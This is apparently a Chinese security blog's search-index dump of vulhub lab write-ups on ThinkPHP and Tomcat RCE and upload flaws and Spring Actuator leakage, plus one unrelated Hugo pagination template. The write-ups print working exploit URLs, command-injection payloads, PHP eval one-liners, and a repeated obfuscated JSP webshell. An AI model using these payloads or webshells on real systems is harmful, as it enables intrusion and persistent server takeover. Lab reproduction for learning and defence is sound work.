参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块\n1 java -Dfile.encoding=\u0026#34;UTF-8\u0026#34; --module-path \u0026#34;C:\\Program Files\\Java\\javafx-sdk-11.0.2\\lib\u0026#34; --add-modules \u0026#34;javafx.controls,javafx.fxml,javafx.web\u0026#34; -jar \u0026#34;xxx.jar\u0026#34; 1 2 3 4 5 6 支持大部分ThinkPHP漏洞检测,整合20多个payload 支持部分漏洞执行命令 支持单一漏洞批量检测 支持TP3和TP5自定义路径日志遍历 支持部分漏洞一键GetShell 支持设置代理和UA ","date":"2025-09-04T00:00:00Z","image":"http://localhost:1313/images/33.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/","title":"【Thinkphp】漏洞利用工具-thinkphp_gui_tools"},{"content":"环境搭建 1 2 3 进入Vulhub cd vulhub-master\\thinkphp\\in-sqlinjection docker compose up -d # 启动后为空白页面，需通过Payload触发漏洞 搭建好后是空白页面\n漏洞利用 报错注入 Payload： 1 http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1 执行后会显示数据库用户信息（如root@localhost）。 信息泄露利用： 获取数据库版本：ids[0,updatexml(0,concat(0xa,version()),0)]=1 读取文件：ids[0,load_file('/etc/passwd')]=1（需数据库权限）\n利用报错来查看版本信息\n利用工具进行测试：\n其他 1 2 3 4 [+] 存在ThinkPHP 5 SQL注入漏洞 \u0026amp;\u0026amp; 敏感信息泄露 Payload: http://localhost//index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 [+] 存在ThinkPHP 5.x 数据库信息泄露 Payload: username:root hostname:mysql password:root database:cat ","date":"2025-09-04T00:00:00Z","image":"http://localhost:1313/images/32.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露"},{"content":"漏洞形成原因 框架介绍： ThinkPHP是一款运用极广的PHP开发框架。\n漏洞引入： 其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。\n漏洞如何利用 访问靶机地址+端口号 进入首页\nBurp抓包修改传参方式为Post，传入参数为\n1 \u0026#34;_method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=pwd\u0026#34;，其中pwd为系统执行命令可进行一系列操作。 环境搭建 使用vulhub靶场进行搭建\n1 2 3 cd thinkphp/5.0.23-rce/ docker-compose up -d docker ps 访问链接：\n1 http://192.168.197.140:8080/ 漏洞复现 burp抓包\n修改\n传参方式为Post，url后接入/index.php?s=captch，传入参数为\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=pwd\t尝试写入phpinfo\n参数改成echo \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; info.php\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=echo \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34; \u0026gt; info.php 写入一句话\n1 _method=__construct\u0026amp;filter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=echo \u0026#39;\u0026lt;?php eval($_POST[aaa]); ?\u0026gt;\u0026#39; \u0026gt; shell.php 上蚂剑\n1 2 http://192.168.197.140:8080/shell.php 密码：aaa 成功\n做完实验后关闭环境 docker-compose down\n更多版本 漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样\n5.0.13~5.0.19默认情况下config中的app_debug配置项为false。\n复现的时候需要开启这个\n总结⼀下 5.1.x ：\n1 2 3 4 5 6 7 8 9 10 11 ?s=index/thinkRequest/input\u0026amp;fiLter[]=system\u0026amp;data=pwd ?s=index/thinkviewdriverPhp/dispLay\u0026amp;content=C?php phpinfo();?\u0026gt; ?s=index/thinktempLatedriverfiLe/write\u0026amp;cacheFiLe=sheLL.php\u0026amp;content=C? php phpinfo();?\u0026gt; ?s=index/thinkContainer/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;var ?s[8]=system\u0026amp;vars[f][]=id ?s=index/thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][]=id 5.0.x ：\n1 2 3 4 5 6 7 8 9 ?s=index/thinkconfig/get\u0026amp;name=database.username # 获取配置信息 ?s=index/thinkLang/Load\u0026amp;fiLe= :/ :/test.jpg # 包含任意⽂件 ?s=index/thinkConfig/Load\u0026amp;fiLe= :/ :/t.php # 包含任意.php⽂件 ?s=index/thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][]=id ?s=index|thinkapp/invokefunction\u0026amp;function=caLL_user_func_array\u0026amp;vars[8]=s ystem\u0026amp;vars[f][8]=whoami 5.0.13：\n1 2 3 4 5 http: \u0026#34;php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index 方法：post Body内容： _method= _construct\u0026amp;method=get\u0026amp;fiLter[]=caLL_user_func\u0026amp;get[]=phpinfo _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=GET\u0026amp;get[]=whoami 其他\n1 2 3 4 5 6 7 8 9 10 11 # ThinkPHP ≤ 5.8.f3 POST /?s=index/index s=whoami\u0026amp;_method= _construct\u0026amp;method=\u0026amp;fiLter[]=system # ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug POST / _method= _construct\u0026amp;fiLter[]=system\u0026amp;server[REQUEST_METHOD]=Ls -aL # ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha POST /?s=xxx HTTP/f.f _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=get\u0026amp;get[]=Ls+-aL _method= _construct\u0026amp;fiLter[]=system\u0026amp;method=get\u0026amp;server[REQUEST_METHOD]=L s ","date":"2025-09-04T00:00:00Z","image":"http://localhost:1313/images/31.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞"},{"content":"影响范围 Tomcat8\n环境搭建 这边就还是用vulhub进行复现\n1 2 3 4 5 cd vulhub-master/tomcat/tomcat8 sudo docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 这里使用MSF进行复现：\n1 msfconsole 查找与 tomcat 相关的模块\n1 search tomcat 使用 auxiliary/scanner/http/tomcat_mgr_login 模块\n1 use auxiliary/scanner/http/tomcat_mgr_login 查看需要填写哪些参数\n1 show options 将 rhosts 设置为目标机\n1 set rhosts 172.16.2.174 进行爆破\n1 run 这里成功爆破出账号/密码：\n1 [+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat 点击 Manager App 进行登录\n登录后找到上传点\n将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war\njsp 一句话木马，密码为123\n1 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 上传111.war文件\n访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）\n上蚁剑\n1 2 http://192.168.197.140:8080/11/11.jsp 密码：pass ","date":"2025-09-04T00:00:00Z","image":"http://localhost:1313/images/35.webp","permalink":"http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"【Tomacat漏洞复现】后台弱口令+文件上传"},{"content":"漏洞详情 当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 readonly 参数设置为 false）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。\n关键点：\n触发条件：需手动修改 conf/web.xml 文件中的 readonly 参数为 false（默认值为 true，PUT/DELETE 方法被禁用）。 绕过限制：Tomcat 默认通过 JspServlet 处理 .jsp 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 DefaultServlet 处理： 文件名后添加空格（evil.jsp%20，利用 Windows 不允许文件名以空格结尾的特性）。 使用 NTFS 文件流特性（evil.jsp::$DATA）。 文件名后添加斜杠（evil.jsp/，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。\n影响范围： 受影响的 Tomcat 版本： Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。 部分测试显示 Tomcat 8.5.19 等版本也可能受影响。 操作系统：主要针对 Windows，但通过添加斜杠的绕过方式（evil.jsp/）可扩展至 Linux 系统。\n攻击思路：\n​ 上传木马文件，webshell管理工具进行连接 环境搭建 使用vulhub进行搭建：\n1 2 3 4 cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 burpsuite抓包\n使用webshell generate快速生成木马，项目地址：\n1 https://github.com/cseroad/Webshell_Generate 一句话木马：\n1 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 将生成的木马上传。这里使用PUT方法进行上传，文件名可以是/xxx.jsp/、/xxx.jsp%20、/xxx::$DATA\n1 2 3 4 5 6 7 8 9 10 11 12 PUT /123.jsp/ HTTP/1.1 Host: 192.168.197.140:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Length: 946 \u0026lt;% String H9991 = request.getParameter(\u0026#34;123\u0026#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \u0026#34;\u0026#34;;for (int i = 0; i \u0026lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %\u0026gt; 返回201即上传成功，使用蚁剑进行连接\n1 2 http://192.168.197.140:8080/123.jsp 密码：123 绕过姿势 1 2 3 4 5 6 7 8 1.Windows下不允许文件以空格结尾以 PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格 2.WindowsNTFS流 Put/a001.jsp::$DATA HTTP/1.1 3. /在文件名中是非法的， 也会被去除（Linux/Windows） Put/a001.jsp/http:/1.1 修复建议 把readonly 改成true\n1 \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt; \u0026lt;paramvalue\u0026gt;true\u0026lt;/param-value\u0026gt;\u0026lt;/init-param\u0026gt; ","date":"2025-09-04T00:00:00Z","image":"http://localhost:1313/images/34.webp","permalink":"http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","title":"【Tomcat漏洞复现】CVE-2017-12615任意文件写入"},{"content":"0x00 简介 ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。\n0x01 漏洞概述 ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。\n0x02 影响版本 thinkphp 5.0.x\nthinkphp 5.1.x\n0x03 环境搭建 1、 在docker容器里搭建环境 1 cd vulhub-master/thinkphp/5-rce/ 2、 进入目录下， 启动环境 1 docker-compose up -d 3、 查看环境端口 1 docker ps -a 这里我使用的是我自己的Ubuntu系统搭建的。\n直接访问以下链接即可。\n1 http://192.168.197.140:8080/ 0x04 验证方式 GET方式尝试命令执行，具体请求如下：\n1 http://192.168.197.140:8080/index.php?s=index/think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=whoami 0x05 利用方式 1、URL编码一句话木马内容： 1 echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20 2. 直接访问连接： 1 http://192.168.197.140:8080/index.php?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20 3. 上传一句话木马: 1 2 webshell地址：http://192.168.197.140:8080/shell.php password：x 4. 连接成功！！！ ","date":"2025-09-03T00:00:00Z","image":"http://localhost:1313/images/30.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞"},{"content":"演示效果： 修改： 在\\layouts\\_default文件夹下创建：archives.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 {{ define \u0026#34;body-class\u0026#34; }}template-archives{{ end }} {{ define \u0026#34;main\u0026#34; }} \u0026lt;header\u0026gt; {{- $taxonomy := $.Site.GetPage \u0026#34;taxonomyTerm\u0026#34; \u0026#34;categories\u0026#34; -}} {{- $terms := $taxonomy.Pages -}} {{ if $terms }} \u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;{{ $taxonomy.Title }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;subsection-list\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;article-list--tile\u0026#34;\u0026gt; {{ range $terms }} {{ partial \u0026#34;article-list/tile\u0026#34; (dict \u0026#34;context\u0026#34; . \u0026#34;size\u0026#34; \u0026#34;250x150\u0026#34; \u0026#34;Type\u0026#34; \u0026#34;taxonomy\u0026#34;) }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/header\u0026gt; {{ $pages := where .Site.RegularPages \u0026#34;Type\u0026#34; \u0026#34;in\u0026#34; .Site.Params.mainSections }} {{ $notHidden := where .Site.RegularPages \u0026#34;Params.hidden\u0026#34; \u0026#34;!=\u0026#34; true }} {{ $filtered := ($pages | intersect $notHidden) }} {{ range $filtered.GroupByDate \u0026#34;2006\u0026#34; }} {{ $id := lower (replace .Key \u0026#34; \u0026#34; \u0026#34;-\u0026#34;) }} \u0026lt;div class=\u0026#34;archives-group\u0026#34; id=\u0026#34;{{ $id }}\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;archives-date section-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ $.RelPermalink }}#{{ $id }}\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;article-list--compact\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34; data-total=\u0026#34;{{ len .Pages }}\u0026#34;\u0026gt; {{ range $index, $page := .Pages }} \u0026lt;div class=\u0026#34;article-item\u0026#34; data-index=\u0026#34;{{ $index }}\u0026#34; {{ if ge $index 8 }}style=\u0026#34;display: none;\u0026#34;{{ end }}\u0026gt; {{ partial \u0026#34;article-list/compact\u0026#34; $page }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{/* 如果文章数量超过8篇，显示分页控件 */}} {{ if gt (len .Pages) 8 }} \u0026lt;div class=\u0026#34;archives-pagination\u0026#34; data-year=\u0026#34;{{ .Key }}\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn prev-btn\u0026#34; onclick=\u0026#34;showPrevPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34; disabled\u0026gt;上一页\u0026lt;/button\u0026gt; \u0026lt;span class=\u0026#34;pagination-info\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;current-page\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; / \u0026lt;span class=\u0026#34;total-pages\u0026#34;\u0026gt;{{ math.Ceil (div (len .Pages) 8.0) }}\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;button class=\u0026#34;pagination-btn next-btn\u0026#34; onclick=\u0026#34;showNextPage(\u0026#39;{{ .Key }}\u0026#39;)\u0026#34;\u0026gt;下一页\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;style\u0026gt; .archives-pagination { display: flex; justify-content: center; align-items: center; gap: 15px; margin: 20px 0; padding: 15px; background: var(--card-background); border-radius: 8px; } .pagination-btn { padding: 8px 16px; border: 1px solid var(--border-color); background: var(--card-background); color: var(--primary-color); border-radius: 4px; cursor: pointer; transition: all 0.2s ease; } .pagination-btn:hover:not(:disabled) { background: #ff69b4; color: white; } .pagination-btn:disabled { opacity: 0.5; cursor: not-allowed; } .pagination-info { font-size: 14px; color: var(--secondary-text-color); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; const paginationState = {}; function initPagination(year) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const totalItems = parseInt(container.dataset.total); const itemsPerPage = 8; const totalPages = Math.ceil(totalItems / itemsPerPage); paginationState[year] = { currentPage: 1, totalPages: totalPages, itemsPerPage: itemsPerPage }; } function showPage(year, page) { const container = document.querySelector(`[data-year=\u0026#34;${year}\u0026#34;]`); const items = container.querySelectorAll(\u0026#39;.article-item\u0026#39;); const startIndex = (page - 1) * 8; const endIndex = startIndex + 8; items.forEach((item, index) =\u0026gt; { if (index \u0026gt;= startIndex \u0026amp;\u0026amp; index \u0026lt; endIndex) { item.style.display = \u0026#39;block\u0026#39;; } else { item.style.display = \u0026#39;none\u0026#39;; } }); // 更新分页控件 const pagination = document.querySelector(`.archives-pagination[data-year=\u0026#34;${year}\u0026#34;]`); if (pagination) { const currentPageSpan = pagination.querySelector(\u0026#39;.current-page\u0026#39;); const prevBtn = pagination.querySelector(\u0026#39;.prev-btn\u0026#39;); const nextBtn = pagination.querySelector(\u0026#39;.next-btn\u0026#39;); currentPageSpan.textContent = page; prevBtn.disabled = page === 1; nextBtn.disabled = page === paginationState[year].totalPages; } paginationState[year].currentPage = page; } function showNextPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026lt; paginationState[year].totalPages) { showPage(year, paginationState[year].currentPage + 1); } } function showPrevPage(year) { if (paginationState[year] \u0026amp;\u0026amp; paginationState[year].currentPage \u0026gt; 1) { showPage(year, paginationState[year].currentPage - 1); } } // 初始化所有年份的分页 document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { const archivesGroups = document.querySelectorAll(\u0026#39;.archives-group\u0026#39;); archivesGroups.forEach(group =\u0026gt; { const year = group.querySelector(\u0026#39;.article-list--compact\u0026#39;).dataset.year; if (year) { initPagination(year); } }); }); \u0026lt;/script\u0026gt; {{ partialCached \u0026#34;footer/footer\u0026#34; . }} {{ end }} 即可！！！\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/28.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E4%B8%8B%E4%B8%80%E9%A1%B5%E9%85%8D%E7%BD%AE/","title":"【Hugo】hugo-stack主题魔改-归档下一页配置"},{"content":"0x00 实验环境 攻击机：Win 11\n靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）\nvulhub靶场下载地址：\n1 https://vulhub.org/zh#/environments/thinkphp/2-rce/ 部署：\n1 2 3 cd vulhub-master/thinkphp/2-rce docker-compose up -d docker ps 0x01 影响版本 标志：/index.php\n版本：thinkphp2.x\n简介：在ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：\n1 $res = preg_replace(\u0026#39;@(\\w+)\u0026#39;.$depr.\u0026#39;([^\u0026#39;.$depr.\u0026#39;\\/]+)@e\u0026#39;, \u0026#39;$var[\\\u0026#39;\\\\1\\\u0026#39;]=\u0026#34;\\\\2\u0026#34;;\u0026#39;, implode($depr,$paths)); 导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞\n大体说的还是因为php版本在5.6.29以下时都是支持该函数执行中间的命令的，可到了7.x就不支持了。简单来讲就是\n1 preg_replace(\u0026#39;正则规则\u0026#39;,\u0026#39;替换字符\u0026#39;,\u0026#39;目标字符\u0026#39;) e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;\n/e 可执行模式，此为PHP专有参数，例如preg_replace函数。\n例如：\n1 2 \u0026lt;?php @preg_replace(\u0026#39;/test/e\u0026#39;,\u0026#39;print_r(\u0026#34;AAA\u0026#34;);\u0026#39;,\u0026#39;just test\u0026#39;); 只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。\n0x02 漏洞复现 注：复现是比较简单的，原理需要自己去深入剖析\n（1）访问页面\n（2）使用报错爆出thinkphp的版本2.1：\n1 http://192.168.197.140:8080/index.php/111 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件\u0026lt;=php5.6.29，下面这个版本是满足条件的：\n（4）漏洞利用：\n1 http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()} （5）传马，使用以下语句（类似于在该页面写入了一句话木马）：\n1 http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))} 菜刀与蚁剑均能连接：\n蚁剑连接：\n0x02 漏洞修复 升级框架版本\nThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。最彻底的方式是升级到官方支持的最新版本（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。\n","date":"2025-09-02T00:00:00Z","image":"http://localhost:1313/images/29.webp","permalink":"http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行"},{"content":"0x00 什么是Actuator Spring Boot Actuator 模块提供了健康检查，审计，指标收集，HTTP 跟踪等，是帮助我们监控和管理Spring Boot 应用的模块。这个模块采集应用的内部信息，展现给外部模块，可以查看应用配置的详细信息，例如自动化配置信息、创建的Spring beans信息、系统环境变量的配置信息以及Web请求的详细信息等。\n如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator端点）。其中heapdump作为Actuator组件最为危险的Web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息。\nSpringBoot 1.x 和 2.x 的 Actuator模块设置有差别，访问功能的路径也有差别，但现在多使用的SpringBoot版本为2.x，这篇文章只讲SpringBoo 2.x Actuator模块带来的信息泄露。\n0x01 Actuator 使用 如果要使用 SpringBoot Actuator 提供的监控功能，需要先加入相关的 maven dependency：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 只要加上了这个actuator依赖，SpringBoot 在运行时会自动开启/actuator/health和/actuator/info这两个 endpoint。\n为了更方便漏洞利用，当前环境在一个CMS中加入了该依赖，因为自己新建的Springboot项目没有配置数据库之类的信息。\n0x02 Endpoints 介绍 Spring Boot 提供了所谓的 endpoints （下文翻译为端点）给外部来与应用程序进行访问和交互。\n打比方来说，/health 端点 提供了关于应用健康情况的一些基础信息。metrics 端点提供了一些有用的应用程序指标（JVM 内存使用、系统CPU使用等）。\n这些 Actuator 模块本来就有的端点我们称之为原生端点。根据端点的作用的话，我们大概可以分为三大类：\n应用配置类：获取应用程序中加载的应用配置、环境变量、自动化配置报告等与Spring Boot应用密切相关的配置类信息。 度量指标类：获取应用程序运行过程中用于监控的度量指标，比如：内存信息、线程池信息、HTTP请求统计等。 操作控制类：提供了对应用的关闭等操作类功能。 需要注意的就是：\n每一个端点都可以通过配置来单独禁用或者启动\n不同于Actuator 1.x，Actuator 2.x 的大多数端点默认被禁掉。Actuator 2.x 中的默认端点增加了/actuator前缀。默认暴露的两个端点为/actuator/health和 /actuator/info\n原生端点如下：\n请求方法 端点 描述 GET /actuator 查看有哪些 Actuator端点是开放的。 GET /actuator/auditevent auditevents端点提供有关应用程序审计事件的信息。 GET /actuator/beans beans端点提供有关应用程序 bean 的信息。 GET /actuator/conditions conditions端点提供有关配置和自动配置类条件评估的信息。 GET /actuator/configprops configprops端点提供有关应用程序@ConfigurationPropertiesbean的信息。 GET /actuator/env 查看全部环境属性，可以看到 SpringBoot 载入哪些 properties，以及 properties 的值（会自动用*替换 key、password、secret 等关键字的 properties 的值）。 GET /actuator/flyway flyway端点提供有关 Flyway 执行的数据库迁移的信息。 GET /actuator/health 端点提供有关应用程序运行状况的health详细信息。 GET /actuator/heapdump heapdump端点提供来自应用程序 JVM 